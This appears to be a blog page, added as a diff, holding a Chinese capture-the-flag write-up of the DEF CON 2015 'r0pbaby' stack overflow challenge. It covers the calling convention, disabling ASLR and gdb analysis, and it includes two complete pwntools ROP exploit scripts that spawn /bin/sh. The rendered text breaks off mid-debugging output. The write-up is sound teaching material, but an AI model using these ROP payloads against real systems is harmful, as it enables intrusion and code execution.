@@ -1,0 +1,396 @@
+
+<!DOCTYPE html>
+<html lang="zh-cn">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Ant Park">
+    <title>2015Defcon-Ropbaby - Ant Park</title>
+    <meta name="author" content="Yuan Shen">
+    
+    
+        <link rel="icon" href="http://yoursite.com/assets/images/yuan.png">
+    
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuan Shen","sameAs":[],"image":"yuan.jpg"},"articleBody":"声明：本篇的作者 Moonshadow（CCSR小组重要成员之一）\n题目：\n123456789101112131415161718192021222324./r0pbaby_542ee6516410709a1421141501f03760 &lt;!--more--&gt;Welcome to an easy Return Oriented Programming challenge...Menu:1) Get libc address2) Get address of a libc function3) Nom nom r0p buffer to stack4) Exit: 1libc.so.6: 0x00007FF0352429B01) Get libc address2) Get address of a libc function3) Nom nom r0p buffer to stack4) Exit: 2Enter symbol: systemSymbol system: 0x00007FF034A9DC401) Get libc address2) Get address of a libc function3) Nom nom r0p buffer to stack4) Exit:\n\n\n背景知识64位CPU汇编代码参数传递方式在32位CPU的函数调用过程中，由于寄存器个数较少，因此通常采用在栈中传参；而在64位CPU的函数调用过程中，通常采用寄存器方式传递参数，仅当参数较多时，采用函数栈中传递参数。\nLinux系统下的64位程序传参约定如下：1、当参数少于7个时，参数从左到右放入寄存器: RDI,RSI,RDX,RCX,R8,R9\n2、当参数为7个及以上时， 前6个参数采用寄存器传参（同上），后面的参数依次从“右向左”放入栈中，即和32位汇编一样。\n示例如下：\n12345H(a, b, c, d, e, f, g, h);a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9h-&gt;(%esp)g-&gt;(%esp)call H\nWindows系统下的64位程序传参约定如下：1、当参数少于5个时， 参数从左到右放入寄存器: RCX,RDX,R8,R9\n2、当参数为5个及以上时， 前4个参数采用寄存器传参（同上），后面的参数依次从 “右向左” 放入栈中，即和32位汇编一样（注，与Linux不同的事，在栈中仍为这4个参数预留了32个字节的空间）。\nLinux/Windows系统下64位程序的函数返回值仍通过RAX传递。\nLinux系统（Ubuntu）关闭ASLR机制在调试程序的过程中，如果需要多次加载ELF或SO动态库，为了保证每次加载的基地址不变，可以临时关闭ASLR机制。\n查看ASLR当前状态命令：12345cat /proc/sys/kernel/randomize_va_space返回结果的含义：0 = 关闭ASLR1 = 半随机：共享库、栈、mmap() 以及 VDSO 将被随机化2 = 全随机。除了1中所述，还有heap也被随机化。\n关闭ASLR命令12345$ suPassword: ******# echo 0 &gt; /proc/sys/kernel/randomize_va_space # cat /proc/sys/kernel/randomize_va_space 0\n漏洞分析漏洞分析过程主要通过对目标程序的静态分析或动态执行，构造特定的输入触发漏洞，本题为一个典型的栈溢出漏洞。以下通过两种方法开展漏洞分析。\n方式一: 代码分析法尝试运行程序，在菜单中发现当选择3时，可触发溢出并使得程序崩溃，如下图所示：\n\n使用IDA Pro对程序进行静态分析，当选择菜单3时，在代码.text:0000555555554E4E位置调用了memcpy()函数，经过分析这正是引发溢出的关键代码点，代码块如下：\n\n动态调试ropbaby程序，确认当选择菜单3并输入&gt;=8个字节时，则会覆盖main函数的返回地址，覆盖前后的代码对比如下：\n\n方式二: 运行状态分析法运行状态分析法通过观察程序崩溃时的程序状态（包括寄存器、堆栈、数据区等），分析哪些异常数据触发了溢出，为进一步构造漏洞利用代码提供帮助。\n笔者采用安装了Peda的GDB进行调试（安装过程详见参考资料3），过程如下：\n1234567891011121314151617181920212223$ gdb ropbaby……gdb-peda$ pattern_create 50'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'gdb-peda$ runStarting program: /home/roy/ropbaby/ropbaby Welcome to an easy Return Oriented Programming challenge...Menu:1) Get libc address2) Get address of a libc function3) Nom nom r0p buffer to stack4) Exit: 3Enter bytes to send (max 1024): 50AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA1) Get libc address2) Get address of a libc function3) Nom nom r0p buffer to stack4) Exit: Bad choice.Program received signal SIGSEGV, Segmentation fault.\n根据上表结果，当随机生成长度为50的字符串，并运行程序后，程序发生了崩溃，此时已触发异常，查看堆栈、RSP寄存器数据，结果如下：\n\n上图显示，当代码执行到0x555555554eb3 ret时，函数返回，从rsp指针指向的栈顶地址中取出8个字节到rip寄存器继续执行，而此时栈顶数据为输入的字符串数据，显然返回地址已被覆盖，计算偏移量如下：\n\n即返回地址在输入字符串的偏移量为8，这与方法一中的结果一致。\n结论：方法一和方法二结果显示，当输入的数据大于8个字节时，即触发栈溢出。并且，覆盖返回地址的偏移量为8。\n两种方式对比：方式一从汇编代码的角度剖析漏洞本质，更深入；方式二从程序运行状态监测溢出点，更快捷。\n漏洞利用该题向参赛者发布ELF文件ropbaby和libc-2.23.so，参赛者利用ropbaby的漏洞连接远端地址，并触发漏洞获得远程主机的shell后获得flag。因此，获得shell通常需要执行system(“/bin/sh”)命令，即溢出后使得RIP跳转到system函数并执行。\n查询ropbaby的安全状态如下图所示，该程序启用了DEP，因此需要构建ROP片段执行代码。\n\n笔者提供2中构建ROP Gadget的方法，分别如下：\nGadget 1：栈空间的布局如下，当函数返回时，执行0x7fffffffdd68引用的gadget：\n\n\n\n0x7fffffffdd60\nAAAAAAAA填充8字节\n\n\n\n\n0x7fffffffdd68\nROP Gadget，函数返回时执行 pop rax,   pop rdi, call rax\n\n\n0x7fffffffdd70\nsystem函数地址\n\n\n0x7fffffffdd78\n/bin/sh 字符串地址\n\n\n\n1. 查找ROP Gadget\n使用ROPgadget工具查找代码片段（ROPgadget安装过程详见参考资料4），查询结果如下：\n\n如上图所示，符合条件的Gadget在libc-2.23.so的偏移量为0x0000000000107419。\n2. 查找system函数地址\n使用objdump命令查找libc库的导出函数偏移地址，查询结果如下：\n\n如上图所示，system函数在libc-2.23.so的偏移量为0x0000000000045390。\n3. 查找/bin/sh字符串地址\n使用strings命令查找libc.so库中该字符串的偏移地址，查询结果如下：\n\n如上图所示，/bin/sh字符串在libc-2.23.so的偏移量为0x18cd57。\n以上获得的3个地址，均为偏移地址，此时还需要获得libc库加载的基地址。从ropbaby提供的功能看，菜单选项1为获得libc基地址，如下：\n\n分析代码中的菜单1选项的代码逻辑，可以看到：\n\n程序在执行首先调用dlopen()函数动态加载libc.so.6库，并把返回的句柄handle写入[rbp+handle]，当选择菜单1选项后，获得handle，并打印输出，逻辑如下：\n\n可见菜单1返回的仅为libc库的调用句柄，而非libc加载的基地址。因此，若需获得libc加载的基地址，需要应用菜单2选项，获得system函数的虚拟地址，减去上文中获得的system函数的偏移量，即可获得libc函数的基地址。漏洞利用脚本的关键代码如下：\n12345678910system_offset = 0x45390bin_sh_offset = 0x18cd57rop_gadget_offset = 0x107419   # pop rax, pop rdi, call raxlibc_base_addr = parse_addr(system_addr) - system_offset  # libc基地址bin_sh_addr = libc_base_addr + bin_sh_offset  # /bin/sh 字符串的地址rop_gadget_addr = libc_base_addr + rop_gadget_offset  # gadget地址payload = 'A'*8payload += p64(rop_gadget_addr)payload += p64(parse_addr(system_addr))payload += p64(bin_sh_addr)\n完整代码可见附件ropbaby2.py\nGadget 2：栈空间的布局如下，当函数返回时，执行0x7fffffffdd68引用的gadget：\n\n\n\n0x7fffffffdd60\nAAAAAAAA填充8字节\n\n\n\n\n0x7fffffffdd68\nROP Gadget，函数返回时执行 pop rdi,   ret\n\n\n0x7fffffffdd70\n/bin/sh 字符串地址\n\n\n0x7fffffffdd78\nsystem函数地址\n\n\n\n获取所需地址的方法详见Gadget 1，关键代码如下：\n12345678910system_offset = 0x45390bin_sh_offset = 0x18cd57rop_gadget_offset = 0x21102   # pop rdi, retlibc_base_addr = parse_addr(system_addr) - system_offset  # libc基地址bin_sh_addr = libc_base_addr + bin_sh_offset  # /bin/sh 字符串的地址rop_gadget_addr = libc_base_addr + rop_gadget_offset  # gadget地址payload = 'A'*8payload += p64(rop_gadget_addr)payload += p64(bin_sh_addr)payload += p64(parse_addr(system_addr))\n完整代码可见附件ropbaby3.py\n后记本题为一个典型的栈溢出漏洞利用题目，由于程序开启了DEP，因此需要构建ROP Gadget进行利用。\n参考资料[1] 64位CPU汇编代码参数传递方式\nhttp://abcdxyzk.github.io/blog/2012/11/23/assembly-args/\n[2] Linux下关闭ALSR(地址空间随机化)的方法\nhttps://blog.csdn.net/force_eagle/article/details/8024502\n[3] GDB实用插件(peda, gef, gdbinit)全解\nhttps://blog.csdn.net/gatieme/article/details/63254211\n[4] ROPgadget\nhttps://github.com/JonathanSalwan/ROPgadget/tree/master\n再次感谢Moonshadow@CCSR的友情分享附件ropbaby2.py123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *system_offset = 0x45390bin_sh_offset = 0x18cd57rop_gadget_offset = 0x107419   # pop rax, pop rdi, call rax# parse addrdef parse_addr(buffer):    re_addr=re.compile(r\"0x([0-9A-Z]&#123;16,16&#125;)\")  #re    addr_str=re_addr.findall(buffer)    addr = 0x0    if addr_str != None:        addr = int(addr_str[0], 16)    return addrif __name__ == '__main__':    sh = process(\"/home/roy/ropbaby/ropbaby\")    sh.recvuntil(': ')    sh.sendline(\"1\")    libcBaseAddr = sh.recvline()    print(libcBaseAddr)    sh.recvuntil(': ')    sh.sendline(\"2\")    sh.recvuntil(\": \")    sh.sendline(\"system\")    system_addr = sh.readline()    print(system_addr)    libc_base_addr = parse_addr(system_addr) - system_offset    bin_sh_addr = libc_base_addr + bin_sh_offset    rop_gadget_addr = libc_base_addr + rop_gadget_offset    payload = 'A'*8    payload += p64(rop_gadget_addr)    payload += p64(parse_addr(system_addr))    payload += p64(bin_sh_addr)    # print(payload)    # sh.recvuntil(': ')    sh.sendline(\"3\")    sh.recvuntil(\": \")    sh.sendline(\"32\")    sh.sendline(payload)    sh.recv()    # sh.recvuntil(': ')    # sh.sendline('4')    sh.interactive()\nropbaby3.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *system_offset = 0x45390bin_sh_offset = 0x18cd57rop_gadget_offset = 0x21102   # pop rdi, ret# parse addrdef parse_addr(buffer):    re_addr=re.compile(r\"0x([0-9A-Z]&#123;16,16&#125;)\")  #re    addr_str=re_addr.findall(buffer)    addr = 0x0    if addr_str != None:        addr = int(addr_str[0], 16)    return addrif __name__ == '__main__':    sh = process(\"/home/roy/ropbaby/ropbaby\")    sh.recvuntil(': ')    sh.sendline(\"1\")    libcBaseAddr = sh.recvline()    print(libcBaseAddr)    sh.recvuntil(': ')    sh.sendline(\"2\")    sh.recvuntil(\": \")    sh.sendline(\"system\")    system_addr = sh.readline()    print(system_addr)    libc_base_addr = parse_addr(system_addr) - system_offset    bin_sh_addr = libc_base_addr + bin_sh_offset    rop_gadget_addr = libc_base_addr + rop_gadget_offset    payload = 'A'*8    payload += p64(rop_gadget_addr)    payload += p64(bin_sh_addr)    payload += p64(parse_addr(system_addr))    # print(payload)    # sh.recvuntil(': ')    sh.sendline(\"3\")    sh.recvuntil(\": \")    sh.sendline(\"32\")    sh.sendline(payload)    sh.recv()    # sh.recvuntil(': ')    # sh.sendline('4')    sh.interactive()\n","dateCreated":"2018-10-10T16:35:38+08:00","dateModified":"2018-10-10T17:34:50+08:00","datePublished":"2018-10-10T16:35:38+08:00","description":"声明：本篇的作者 Moonshadow（CCSR小组重要成员之一）\n题目：\n123456789101112131415161718192021222324./r0pbaby_542ee6516410709a1421141501f03760 &lt;!--more--&gt;Welcome to an easy Return Oriented Programming challenge...Menu:1) Get libc address2) Get address of a libc function3) Nom nom r0p buffer to stack4) Exit: 1libc.so.6: 0x00007FF0352429B01) Get libc address2) Get address of a libc function3) Nom nom r0p buffer to stack4) Exit: 2Enter symbol: systemSymbol system: 0x00007FF034A9DC401) Get libc address2) Get address of a libc function3) Nom nom r0p buffer to stack4) Exit:","headline":"2015Defcon-Ropbaby","image":["https://ws2.sinaimg.cn/large/0069RVTdly1fv9d6x9yhjj30o60iqau7.jpg","image-2.png"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2018/10/10/2015Defcon-Ropbaby/"},"publisher":{"@type":"Organization","name":"Yuan Shen","sameAs":[],"image":"yuan.jpg","logo":{"@type":"ImageObject","url":"yuan.jpg"}},"url":"http://yoursite.com/2018/10/10/2015Defcon-Ropbaby/","keywords":"writeup, 2015Defcon, pwn","thumbnailUrl":"https://ws2.sinaimg.cn/large/0069RVTdly1fv9d6x9yhjj30o60iqau7.jpg"}</script>
+    <meta name="description" content="声明：本篇的作者 Moonshadow（CCSR小组重要成员之一） 题目： 123456789101112131415161718192021222324./r0pbaby_542ee6516410709a1421141501f03760 &amp;lt;!--more--&amp;gt;Welcome to an easy Return Oriented Programming challenge...Menu">
+<meta name="keywords" content="writeup,2015Defcon,pwn">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="2015Defcon-Ropbaby">
+<meta property="og:url" content="http://yoursite.com/2018/10/10/2015Defcon-Ropbaby/index.html">
+<meta property="og:site_name" content="Ant Park">
+<meta property="og:description" content="声明：本篇的作者 Moonshadow（CCSR小组重要成员之一） 题目： 123456789101112131415161718192021222324./r0pbaby_542ee6516410709a1421141501f03760 &amp;lt;!--more--&amp;gt;Welcome to an easy Return Oriented Programming challenge...Menu">
+<meta property="og:locale" content="zh-cn">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwly1fw3855ufi6j30f408mq3t.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwly1fw385n2j42j307e04mjrj.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fw3867ccnhj30uw0ea47m.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fw387j28vyj30n20f677k.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fw387u0kzpj30lo016glx.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fw38a0jcofj309o058ab8.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fw38bv4vlmj30pg01cglv.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwly1fw38ciia2yj30n2026751.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fw38d6ikpij30n201a3ym.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fw38dvr24nj30i004o74s.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwly1fw38ebc4gjj30h403at94.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fw38er6qmdj30li03ijry.jpg">
+<meta property="og:updated_time" content="2018-10-10T09:34:50.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2015Defcon-Ropbaby">
+<meta name="twitter:description" content="声明：本篇的作者 Moonshadow（CCSR小组重要成员之一） 题目： 123456789101112131415161718192021222324./r0pbaby_542ee6516410709a1421141501f03760 &amp;lt;!--more--&amp;gt;Welcome to an easy Return Oriented Programming challenge...Menu">
+<meta name="twitter:image" content="https://ws3.sinaimg.cn/large/006tNbRwly1fw3855ufi6j30f408mq3t.jpg">
+    
+    
+        
+    
+    
+        <meta property="og:image" content="http://yoursite.com/assets/images/yuan.jpg"/>
+    
+    
+        <meta property="og:image" content="https://ws2.sinaimg.cn/large/0069RVTdly1fv9d6x9yhjj30o60iqau7.jpg"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://ws2.sinaimg.cn/large/0069RVTdly1fv9d6x9yhjj30o60iqau7.jpg" />
+    
+    
+        <meta property="og:image" content="http://yoursite.com/2018/10/10/2015Defcon-Ropbaby/image-2.png"/>
+        <meta class="swiftype" name="image" data-type="enum" content="http://yoursite.com/2018/10/10/2015Defcon-Ropbaby/image-2.png" />
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/style-du2xmrqdqrl2ollgeiw050kpl6l4nbyz7bumjuurjgsxyopifvukebxc9lqe.min.css">
+    <!--STYLES END-->
+    
+
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+        
+            
+        
+    
+
+<header id="header" data-behavior="4">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a class="header-title-link" href="/ ">Ant Park</a>
+    </div>
+    
+        
+            <a  class="header-right-picture "
+                href="#about">
+        
+        
+            <img class="header-picture" src="/assets/images/yuan.jpg" alt="作者的图片"/>
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+
+        
+    
+
+<nav id="sidebar" data-behavior="4">
+    <div class="sidebar-container">
+        
+            <div class="sidebar-profile">
+                <a href="/#about">
+                    <img class="sidebar-profile-picture" src="/assets/images/yuan.jpg" alt="作者的图片"/>
+                </a>
+                <h4 class="sidebar-profile-name">Yuan Shen</h4>
+                
+                    <h5 class="sidebar-profile-bio"><p>author.bio</p>
+</h5>
+                
+            </div>
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/ "
+                            
+                            title="首页"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">首页</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-categories"
+                            
+                            title="分类"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">分类</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-tags"
+                            
+                            title="标签"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">标签</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-archives"
+                            
+                            title="归档"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">归档</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+        <div class="post-header-cover
+                    text-center
+                    post-header-cover--full"
+             style="background-image:url('/2018/10/10/2015Defcon-Ropbaby/image-2.png');"
+             data-behavior="4">
+            
+        </div>
+
+            <div id="main" data-behavior="4"
+                 class="hasCover
+                        hasCoverMetaOut
+                        hasCoverCaption">
+                
+<article class="post">
+    
+        <span class="post-header-cover-caption caption">Starry sky</span>
+    
+    
+        <div class="post-header main-content-wrap text-center">
+    
+        <h1 class="post-title">
+            2015Defcon-Ropbaby
+        </h1>
+    
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p>声明：本篇的作者 Moonshadow（CCSR小组重要成员之一）</p>
+<p>题目：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">./r0pbaby_542ee6516410709a1421141501f03760 </span><br><span class="line"></span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line"></span><br><span class="line">Welcome to an easy Return Oriented Programming challenge...</span><br><span class="line">Menu:</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 1</span><br><span class="line">libc.so.6: 0x00007FF0352429B0</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 2</span><br><span class="line">Enter symbol: system</span><br><span class="line">Symbol system: 0x00007FF034A9DC40</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">:</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<h1 id="table-of-contents">目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#背景知识"><span class="toc-text">背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#64位CPU汇编代码参数传递方式"><span class="toc-text">64位CPU汇编代码参数传递方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux系统下的64位程序传参约定如下："><span class="toc-text">Linux系统下的64位程序传参约定如下：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows系统下的64位程序传参约定如下："><span class="toc-text">Windows系统下的64位程序传参约定如下：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux系统（Ubuntu）关闭ASLR机制"><span class="toc-text">Linux系统（Ubuntu）关闭ASLR机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#查看ASLR当前状态命令："><span class="toc-text">查看ASLR当前状态命令：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#关闭ASLR命令"><span class="toc-text">关闭ASLR命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#方式一-代码分析法"><span class="toc-text">方式一: 代码分析法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方式二-运行状态分析法"><span class="toc-text">方式二: 运行状态分析法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-1："><span class="toc-text">Gadget 1：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-2："><span class="toc-text">Gadget 2：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-text">后记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-text">参考资料</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#再次感谢Moonshadow-CCSR的友情分享"><span class="toc-text">再次感谢Moonshadow@CCSR的友情分享</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#附件"><span class="toc-text">附件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ropbaby2-py"><span class="toc-text">ropbaby2.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ropbaby3-py"><span class="toc-text">ropbaby3.py</span></a></li></ol></li></ol>
+<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="64位CPU汇编代码参数传递方式"><a href="#64位CPU汇编代码参数传递方式" class="headerlink" title="64位CPU汇编代码参数传递方式"></a>64位CPU汇编代码参数传递方式</h3><p>在32位CPU的函数调用过程中，由于寄存器个数较少，因此通常采用在栈中传参；而在64位CPU的函数调用过程中，通常采用寄存器方式传递参数，仅当参数较多时，采用函数栈中传递参数。</p>
+<h4 id="Linux系统下的64位程序传参约定如下："><a href="#Linux系统下的64位程序传参约定如下：" class="headerlink" title="Linux系统下的64位程序传参约定如下："></a>Linux系统下的64位程序传参约定如下：</h4><p>1、当参数少于7个时，参数从左到右放入寄存器: RDI,RSI,RDX,RCX,R8,R9</p>
+<p>2、当参数为7个及以上时， 前6个参数采用寄存器传参（同上），后面的参数依次从“右向左”放入栈中，即和32位汇编一样。</p>
+<p>示例如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">H(a, b, c, d, e, f, g, h);</span><br><span class="line"><span class="meta">a-&gt;</span>%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9</span><br><span class="line"><span class="meta">h-&gt;</span>(%esp)</span><br><span class="line"><span class="meta">g-&gt;</span>(%esp)</span><br><span class="line">call H</span><br></pre></td></tr></table></figure>
+<h4 id="Windows系统下的64位程序传参约定如下："><a href="#Windows系统下的64位程序传参约定如下：" class="headerlink" title="Windows系统下的64位程序传参约定如下："></a>Windows系统下的64位程序传参约定如下：</h4><p>1、当参数少于5个时， 参数从左到右放入寄存器: RCX,RDX,R8,R9</p>
+<p>2、当参数为5个及以上时， 前4个参数采用寄存器传参（同上），后面的参数依次从 “右向左” 放入栈中，即和32位汇编一样（注，与Linux不同的事，在栈中仍为这4个参数预留了32个字节的空间）。</p>
+<p><strong>Linux/Windows系统下64位程序的函数返回值仍通过RAX传递。</strong></p>
+<h3 id="Linux系统（Ubuntu）关闭ASLR机制"><a href="#Linux系统（Ubuntu）关闭ASLR机制" class="headerlink" title="Linux系统（Ubuntu）关闭ASLR机制"></a>Linux系统（Ubuntu）关闭ASLR机制</h3><p>在调试程序的过程中，如果需要多次加载ELF或SO动态库，为了保证每次加载的基地址不变，可以临时关闭ASLR机制。</p>
+<h4 id="查看ASLR当前状态命令："><a href="#查看ASLR当前状态命令：" class="headerlink" title="查看ASLR当前状态命令："></a>查看ASLR当前状态命令：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">返回结果的含义：</span><br><span class="line">0 = 关闭ASLR</span><br><span class="line">1 = 半随机：共享库、栈、mmap() 以及 VDSO 将被随机化</span><br><span class="line">2 = 全随机。除了1中所述，还有heap也被随机化。</span><br></pre></td></tr></table></figure>
+<h4 id="关闭ASLR命令"><a href="#关闭ASLR命令" class="headerlink" title="关闭ASLR命令"></a>关闭ASLR命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> su</span><br><span class="line">Password: ******</span><br><span class="line"><span class="meta">#</span> echo 0 &gt; /proc/sys/kernel/randomize_va_space </span><br><span class="line"><span class="meta">#</span> cat /proc/sys/kernel/randomize_va_space </span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞分析过程主要通过对目标程序的静态分析或动态执行，构造特定的输入触发漏洞，本题为一个典型的栈溢出漏洞。以下通过两种方法开展漏洞分析。</p>
+<h3 id="方式一-代码分析法"><a href="#方式一-代码分析法" class="headerlink" title="方式一: 代码分析法"></a>方式一: 代码分析法</h3><p>尝试运行程序，在菜单中发现当选择3时，可触发溢出并使得程序崩溃，如下图所示：</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fw3855ufi6j30f408mq3t.jpg" alt=""></p>
+<p>使用IDA Pro对程序进行静态分析，当选择菜单3时，在代码<code>.text:0000555555554E4E</code>位置调用了<code>memcpy()</code>函数，经过分析这正是引发溢出的关键代码点，代码块如下：</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fw385n2j42j307e04mjrj.jpg" alt=""></p>
+<p>动态调试ropbaby程序，确认当选择菜单3并输入&gt;=8个字节时，则会覆盖main函数的返回地址，覆盖前后的代码对比如下：</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw3867ccnhj30uw0ea47m.jpg" alt=""></p>
+<h3 id="方式二-运行状态分析法"><a href="#方式二-运行状态分析法" class="headerlink" title="方式二: 运行状态分析法"></a>方式二: 运行状态分析法</h3><p>运行状态分析法通过观察程序崩溃时的程序状态（包括寄存器、堆栈、数据区等），分析哪些异常数据触发了溢出，为进一步构造漏洞利用代码提供帮助。</p>
+<p>笔者采用安装了Peda的GDB进行调试（安装过程详见<em>参考资料3</em>），过程如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> gdb ropbaby</span><br><span class="line">……</span><br><span class="line"><span class="meta">gdb-peda$</span> pattern_create 50</span><br><span class="line">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'</span><br><span class="line"><span class="meta">gdb-peda$</span> run</span><br><span class="line">Starting program: /home/roy/ropbaby/ropbaby </span><br><span class="line"></span><br><span class="line">Welcome to an easy Return Oriented Programming challenge...</span><br><span class="line">Menu:</span><br><span class="line">1) 